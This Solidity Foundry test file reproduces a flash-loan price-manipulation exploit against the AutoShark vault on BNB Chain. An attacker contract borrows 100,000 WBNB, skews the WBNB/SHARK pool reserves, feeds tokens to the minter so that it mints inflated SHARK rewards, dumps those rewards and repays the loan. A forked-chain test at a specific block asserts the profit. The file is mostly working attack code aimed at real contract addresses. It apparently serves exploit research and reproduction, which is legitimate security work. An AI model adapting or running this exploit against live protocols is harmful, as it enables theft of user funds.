// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IAutoSharkVault {
    function deposit(
        uint256 amount,
        address referrer
    ) external;
    function harvest() external;
    function getReward() external;
}

interface IPantherRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract AutoSharkAttacker {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant SHARK = IERC20(0xf7321385a461C4490d5526D83E63c366b149cB15);
    IERC20 private constant PANTHER_LP = IERC20(0x1fd789Fa513871Cb89Aa655F11ec777cAD1784a0);

    Uni_Pair_V2 private constant FLASH_PAIR = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IAutoSharkVault private constant VAULT = IAutoSharkVault(0xa007D347F2E55d731e101AaE64722C321b2B80dC);
    IPantherRouter private constant ROUTER = IPantherRouter(0x24f7C33ae5f77e2A9ECeed7EA858B4ca2fa1B7eC);
    address private constant MINTER = 0x37ee638d85e420532e35cD9dD831166514855e6D;

    uint256 private constant FLASH_AMOUNT = 100_000 ether;

    function prepare() external {
        PANTHER_LP.approve(address(VAULT), type(uint256).max);
        VAULT.deposit(PANTHER_LP.balanceOf(address(this)), address(ROUTER));
    }

    function attack() external {
        FLASH_PAIR.swap(FLASH_AMOUNT, 0, address(this), hex"01");
    }

    function prepareRewards() external {
        VAULT.harvest();
    }

    function pancakeCall(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(FLASH_PAIR) && amount0 == FLASH_AMOUNT, "invalid callback");

        WBNB.approve(address(ROUTER), type(uint256).max);
        SHARK.approve(address(ROUTER), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHARK);
        ROUTER.swapExactTokensForTokens(50_000 ether, 0, path, address(this), block.timestamp);

        // The minter values the WBNB/SHARK LP from its manipulated reserves.
        WBNB.transfer(MINTER, WBNB.balanceOf(address(this)));
        SHARK.transfer(MINTER, SHARK.balanceOf(address(PANTHER_LP)));
        VAULT.getReward();

        uint256 minted = SHARK.balanceOf(address(this));
        path[0] = address(SHARK);
        path[1] = address(WBNB);
        ROUTER.swapExactTokensForTokens(minted / 2, 0, path, address(this), block.timestamp);

        path = new address[](3);
        path[0] = address(SHARK);
        path[1] = address(BUSD);
        path[2] = address(WBNB);
        ROUTER.swapExactTokensForTokens(SHARK.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        WBNB.transfer(address(FLASH_PAIR), (FLASH_AMOUNT * 1000) / 997 + 1);
    }
}

contract AutoSharkExploitTest is Test {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant PANTHER_LP = IERC20(0x1fd789Fa513871Cb89Aa655F11ec777cAD1784a0);

    AutoSharkAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("bsc", 7_698_695);
        attacker = new AutoSharkAttacker();

        deal(address(PANTHER_LP), address(attacker), 3 ether);
        attacker.prepare();

        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 28_800);
        attacker.prepareRewards();
    }

    function testExploit() public {
        uint256 beforeBalance = WBNB.balanceOf(address(attacker));
        attacker.attack();
        assertGt(WBNB.balanceOf(address(attacker)), beforeBalance);
    }
}
